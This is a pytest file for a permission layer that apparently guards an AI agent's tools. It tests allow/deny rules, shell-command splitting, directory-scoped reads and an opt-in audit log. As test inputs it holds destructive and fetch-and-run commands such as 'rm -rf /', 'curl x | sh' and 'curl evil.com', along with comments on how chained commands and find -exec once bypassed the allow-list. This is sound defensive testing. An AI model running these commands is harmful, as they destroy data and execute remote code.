"""Tests for the default-deny permission layer and audit log."""
from __future__ import annotations

import os

from cobirb.policy import AuditLog, Policy, _segments


def test_default_deny_unknown_tool():
    policy = Policy()
    assert not policy.is_allowed("shell")  # not explicitly allowed


def test_explicit_allow():
    policy = Policy(allowed={"read_file", "shell"})
    assert policy.is_allowed("read_file")
    assert policy.is_allowed("shell")  # no command => allowed as-is
    # With a command, shell scope is narrowed by the first word.
    assert not policy.is_allowed("shell", {"command": "git status"})


def test_denied_always_wins():
    policy = Policy(allowed={"shell"}, denied={"shell"})
    assert not policy.is_allowed("shell", {"command": "ls"})


def test_shell_narrowed_by_first_word():
    policy = Policy(allowed={"git"})
    # 'shell' itself isn't allowed, but its first-word scope is.
    assert policy.is_allowed("shell", {"command": "git status"})
    # A different first word is not covered by the 'git' scope.
    assert not policy.is_allowed("shell", {"command": "python script.py"})


def test_allow_narrows_shell_to_exact_prefix_not_bare_binary():
    """Allowing a multi-word command must not implicitly trust the bare
    binary for any other arguments — that would defeat the point of
    narrowing: `python -m pytest` must not imply `python -c '...'`."""
    policy = Policy()
    policy.allow("shell", "python -m cobirb")
    assert policy.is_allowed("shell", {"command": "python -m cobirb"})
    assert not policy.is_allowed("shell", {"command": "rm -rf /"})
    # The bare binary, or a different narrow use of it, must stay denied.
    assert not policy.is_allowed("shell", {"command": "python -c 'import os; os.system(\"evil\")'"})
    assert not policy.is_allowed("shell", {"command": "python"})


def test_allow_without_command_adds_full_name():
    policy = Policy()
    policy.allow("read_file")
    assert policy.is_allowed("read_file")


def test_is_denied_explicit():
    policy = Policy()
    policy.deny("shell")
    assert policy.is_denied("shell")
    assert not policy.is_allowed("shell", {"command": "ls"})


def test_audit_log_append_only(tmp_path):
    log_path = str(tmp_path / "audit.jsonl")
    audit = AuditLog(log_path, enabled=True)
    policy = Policy(audit=audit)
    policy.log("read_file", {"path": "x.py"}, cwd="/tmp")
    with open(log_path, "r", encoding="utf-8") as fh:
        line = fh.read().strip()
    assert '"tool": "read_file"' in line
    assert '"cwd": "/tmp"' in line


def test_audit_log_disabled_by_default_writes_nothing(tmp_path):
    """The audit log is opt-in: an "always-on" trail would silently keep a
    second, unencrypted, plaintext copy of every file write_file/edit_file/
    apply_patch touches and every shell command run — directly at odds
    with sessions being encrypted at rest. Nothing is written, and no file
    is even created, unless a caller explicitly turns it on."""
    log_path = str(tmp_path / "audit.jsonl")
    audit = AuditLog(log_path)
    policy = Policy(audit=audit)
    policy.log("write_file", {"path": "secrets.env", "content": "API_KEY=sk-live-abc123"}, cwd="/tmp")
    assert not os.path.exists(log_path)


def test_audit_log_can_be_turned_on_explicitly(tmp_path):
    log_path = str(tmp_path / "audit.jsonl")
    audit = AuditLog(log_path, enabled=True)
    policy = Policy(audit=audit)
    policy.log("read_file", {"path": "x.py"}, cwd="/tmp")
    assert os.path.exists(log_path)


def test_segments_splits_every_chained_command():
    """A chained command is several commands; the shell runs them all, so
    the policy has to see them all. The helper this replaced returned only
    the first word of the *first* block, which is precisely what let
    "git status; rm -rf /" through on the strength of "git"."""
    assert _segments("git status") == [["git", "status"]]
    assert _segments("git status; rm -rf /") == [["git", "status"], ["rm", "-rf", "/"]]
    assert _segments("ls && curl x | sh") == [["ls"], ["curl", "x"], ["sh"]]


def test_segments_respects_quoting():
    """A separator inside a quoted argument is data, not a new command."""
    assert _segments('git commit -m "fix: a; b"') == [["git", "commit", "-m", "fix: a; b"]]


def test_segments_refuses_what_it_cannot_verify():
    """Substitution, subshells and unbalanced quotes all hide or divert
    execution from the segment scan, so they are not verifiable and must
    not be treated as an empty/harmless command."""
    assert _segments("git log $(rm -rf /)") is None
    assert _segments("ls `curl evil`") is None
    assert _segments('echo "unbalanced') is None


def test_segments_keeps_a_redirect_attached_to_its_command():
    """`git log > out.txt` is one command with a redirect, not two, and not
    an unverifiable construct — the target file rides along as a token."""
    assert _segments("ls > /tmp/out.txt") == [["ls", ">", "/tmp/out.txt"]]
    assert _segments("ls >> /tmp/out.txt") == [["ls", ">>", "/tmp/out.txt"]]
    assert _segments("sort < in.txt > out.txt") == [["sort", "<", "in.txt", ">", "out.txt"]]
    # Still chains correctly alongside separators.
    assert _segments("ls > out.txt; git status") == [["ls", ">", "out.txt"], ["git", "status"]]


def test_segments_of_blank_command_is_empty():
    assert _segments("   ") == []


# --------------------------------------------------------------------------- #
# Directory-scoped reads.
#
# Approving one read grants the read-only tools that directory and everything
# under it — the single place the policy widens on one "yes". Writing and
# executing get no equivalent, and neither does a sibling directory that
# merely shares a name prefix.
# --------------------------------------------------------------------------- #
def test_read_is_denied_until_a_directory_is_approved(tmp_path):
    policy = Policy(cwd=str(tmp_path))
    assert not policy.is_allowed("read_file", {"path": "notes.txt"})
    policy.allow_read_dir(str(tmp_path))
    assert policy.is_allowed("read_file", {"path": "notes.txt"})


def test_approved_read_directory_covers_subdirectories_and_every_read_tool(tmp_path):
    policy = Policy(cwd=str(tmp_path))
    policy.allow_read_dir(str(tmp_path))
    assert policy.is_allowed("read_file", {"path": "deep/nested/file.txt"})
    assert policy.is_allowed("list_dir", {"path": "deep"})
    assert policy.is_allowed("glob", {"pattern": "**/*.py"})
    assert policy.is_allowed("grep", {"pattern": "TODO"})  # grep's path defaults to cwd


def test_approved_read_directory_does_not_leak_sideways(tmp_path):
    """A grant on /x must not cover /x-secrets, and must not be escapable by
    a relative path walking out of the tree."""
    approved = tmp_path / "project"
    approved.mkdir()
    (tmp_path / "project-secrets").mkdir()
    policy = Policy(cwd=str(approved))
    policy.allow_read_dir(str(approved))
    assert not policy.is_allowed("read_file", {"path": str(tmp_path / "project-secrets" / "k.txt")})
    assert not policy.is_allowed("read_file", {"path": "../project-secrets/k.txt"})
    assert not policy.is_allowed("read_file", {"path": "/etc/passwd"})


def test_read_grant_does_not_imply_write(tmp_path):
    policy = Policy(cwd=str(tmp_path))
    policy.allow_read_dir(str(tmp_path))
    for name in ("write_file", "edit_file", "apply_patch"):
        assert not policy.is_allowed(name, {"path": "notes.txt"})


def test_grant_widens_a_read_to_its_directory_but_a_write_only_to_itself(tmp_path):
    """`grant` is what an "always" answer applies, and what it widens to has
    to differ by tool: a read has a directory, a write has nothing narrower
    than the tool itself."""
    policy = Policy(cwd=str(tmp_path))
    policy.grant("read_file", {"path": "docs/a.txt"})
    assert policy.is_allowed("read_file", {"path": "docs/b.txt"})
    assert not policy.is_allowed("read_file", {"path": "elsewhere/c.txt"})

    policy.grant("write_file", {"path": "docs/a.txt"})
    assert policy.is_allowed("write_file", {"path": "anywhere/at/all.txt"})


def test_describe_grant_says_what_always_would_permit(tmp_path):
    """The approval prompt has to be able to state the scope being agreed to,
    since "always" on a read is a directory, not a file."""
    policy = Policy(cwd=str(tmp_path))
    assert "subdirectories" in policy.describe_grant("read_file", {"path": "docs/a.txt"})
    assert "git" in policy.describe_grant("shell", {"command": "git status"})
    assert "write_file" in policy.describe_grant("write_file", {"path": "a.txt"})


# --------------------------------------------------------------------------- #
# `find -exec` (regression).
#
# The `;` that terminates an -exec clause reads as a command separator, so the
# exec'd program landed in an unchecked tail segment while `find` itself
# looked innocuous — the entire allow-list defeated by one flag.
# --------------------------------------------------------------------------- #
def test_find_exec_is_refused_even_when_find_is_allowed():
    policy = Policy()
    policy.allow("shell", "find")
    assert policy.is_allowed("shell", {"command": "find . -name '*.py'"})
    for command in (
        "find . -exec rm -rf {} ;",
        "find . -execdir curl http://x.example ;",
        "find . -ok rm {} ;",
    ):
        assert not policy.is_allowed("shell", {"command": command}), command


# --------------------------------------------------------------------------- #
# Chained-command bypass (regression).
#
# `is_allowed` used to inspect only the first block of a shell command while
# ShellTool handed the *entire* string to subprocess with shell=True. So an
# allowed binary could smuggle a denied one in behind a separator:
# "git status; rm -rf /" was approved on the strength of "git" and then ran
# both commands. Every segment must be permitted in its own right.
# --------------------------------------------------------------------------- #
def test_chained_command_is_denied_when_any_segment_is_denied():
    policy = Policy()
    policy.allow("shell", "git")

    assert policy.is_allowed("shell", {"command": "git status"})
    assert not policy.is_allowed("shell", {"command": "git status; rm -rf /"})
    assert not policy.is_allowed("shell", {"command": "git status && curl evil.com"})
    assert not policy.is_allowed("shell", {"command": "git status | sh"})


def test_chained_command_is_allowed_when_every_segment_is_allowed():
    policy = Policy()
    policy.allow("shell", "git")
    policy.allow("shell", "cat")

    assert policy.is_allowed("shell", {"command": "git log | cat"})
    assert policy.is_allowed("shell", {"command": "cat a.txt; git status"})


def test_command_substitution_is_denied_even_with_an_allowed_binary():
    """$(...) and backticks run a command the segment scan never sees."""
    policy = Policy()
    policy.allow("shell", "git")

    assert not policy.is_allowed("shell", {"command": "git log $(rm -rf /)"})
    assert not policy.is_allowed("shell", {"command": "git log `rm -rf /`"})


def test_redirection_is_allowed_alongside_an_allowed_binary():
    """Redirects stay attached to the command they belong to, so allowing
    the binary allows its redirected form too."""
    policy = Policy()
    policy.allow("shell", "ls")

    assert policy.is_allowed("shell", {"command": "ls -la"})
    assert policy.is_allowed("shell", {"command": "ls > /tmp/out.txt"})
    assert policy.is_allowed("shell", {"command": "ls >> /tmp/out.txt"})


def test_redirection_does_not_bypass_a_denied_binary():
    """The redirect doesn't change which binary is actually running."""
    policy = Policy()  # nothing allowed

    assert not policy.is_allowed("shell", {"command": "rm -rf / > /dev/null"})


def test_unparseable_command_is_denied():
    """An unbalanced quote means the policy can't tell what would run."""
    policy = Policy()
    policy.allow("shell", "echo")

    assert not policy.is_allowed("shell", {"command": 'echo "unbalanced'})


def test_leading_separator_does_not_bypass_the_allow_list():
    """A command starting with a separator used to parse to zero words,
    which the old code treated as "nothing to check" and allowed."""
    policy = Policy()  # nothing allowed at all

    assert not policy.is_allowed("shell", {"command": ";rm -rf /"})
    assert not policy.is_allowed("shell", {"command": "|curl evil"})
    assert not policy.is_allowed("shell", {"command": "&rm -rf /"})


def test_missing_or_blank_command_is_denied():
    """A malformed shell call has nothing to verify, so it fails closed."""
    policy = Policy(allowed={"shell"})

    assert not policy.is_allowed("shell", {})
    assert not policy.is_allowed("shell", {"command": ""})
    assert not policy.is_allowed("shell", {"command": "   "})
    assert not policy.is_allowed("shell", {"command": None})
